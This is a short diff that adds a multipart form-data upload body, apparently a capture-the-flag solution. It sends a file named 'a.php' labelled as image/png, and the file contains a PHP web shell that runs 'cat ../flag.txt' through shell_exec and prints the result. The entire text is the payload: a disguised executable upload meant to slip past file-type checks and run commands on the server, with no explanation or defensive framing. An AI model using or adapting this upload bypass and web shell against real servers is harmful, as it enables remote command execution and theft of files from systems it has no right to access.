@@ -1,0 +1,10 @@
+-----------------------------76597926716710384763989494291
+Content-Disposition: form-data; name="file"; filename="a.php"
+Content-Type: image/png
+
+<?php
+$output = shell_exec('cat ../flag.txt');
+echo "<pre>$output</pre>";
+exit;
+?>
+-----------------------------76597926716710384763989494291--
